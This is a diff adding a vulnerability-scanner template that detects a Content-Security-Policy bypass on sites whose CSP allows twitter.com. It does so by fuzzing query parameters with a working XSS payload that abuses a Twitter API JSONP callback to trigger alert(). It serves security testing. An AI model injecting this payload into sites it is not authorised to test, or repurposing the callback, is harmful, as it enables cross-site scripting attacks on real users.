@@ -1,0 +1,55 @@
+id: twitter-api-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Twitter API
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,twitter-api
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "twitter.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: twitter_api_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://api.twitter.com/1/statuses/oembed.json?url=https:%2F%2Ftwitter.com%2FMartina%2Fstatus%2F867710263654580226&callback=alert&_=1496363308445"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "twitter_api_csp_xss == true"
+# digest: 490a004630440220616c560eb7a4a96e3afc5f41a05675835cc41ef81d1fa1acf0183241e8c81d120220519a2211bd7af20c6e6facf93cbe32817d1b08dcb0a163a4f72deacb57a325c2:922c64590222798bb761d5b6d8e72950
